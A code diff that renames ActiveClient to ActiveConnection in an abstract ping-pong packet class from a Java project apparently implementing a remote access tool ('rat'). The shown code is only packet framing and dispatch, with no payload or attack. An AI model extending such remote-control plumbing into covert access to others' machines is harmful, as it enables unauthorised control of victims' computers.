@@ -1,6 +1,6 @@
 package de.sogomn.rat.packet;
 
-import de.sogomn.rat.ActiveClient;
+import de.sogomn.rat.ActiveConnection;
 
 public abstract class AbstractPingPongPacket implements IPacket {
 	
@@ -17,20 +17,20 @@ public abstract class AbstractPingPongPacket implements IPacket {
 		this(REQUEST);
 	}
 	
-	protected abstract void sendRequest(final ActiveClient client);
+	protected abstract void sendRequest(final ActiveConnection client);
 	
-	protected abstract void sendData(final ActiveClient client);
+	protected abstract void sendData(final ActiveConnection client);
 	
-	protected abstract void receiveRequest(final ActiveClient client);
+	protected abstract void receiveRequest(final ActiveConnection client);
 	
-	protected abstract void receiveData(final ActiveClient client);
+	protected abstract void receiveData(final ActiveConnection client);
 	
-	protected abstract void executeRequest(final ActiveClient client);
+	protected abstract void executeRequest(final ActiveConnection client);
 	
-	protected abstract void executeData(final ActiveClient client);
+	protected abstract void executeData(final ActiveConnection client);
 	
 	@Override
-	public final void send(final ActiveClient client) {
+	public final void send(final ActiveConnection client) {
 		client.writeByte(type);
 		
 		if (type == REQUEST) {
@@ -41,7 +41,7 @@ public abstract class AbstractPingPongPacket implements IPacket {
 	}
 	
 	@Override
-	public final void receive(final ActiveClient client) {
+	public final void receive(final ActiveConnection client) {
 		type = client.readByte();
 		
 		if (type == REQUEST) {
@@ -52,7 +52,7 @@ public abstract class AbstractPingPongPacket implements IPacket {
 	}
 	
 	@Override
-	public final void execute(final ActiveClient client) {
+	public final void execute(final ActiveConnection client) {
 		if (type == REQUEST) {
 			executeRequest(client);
 		} else if (type == DATA) {
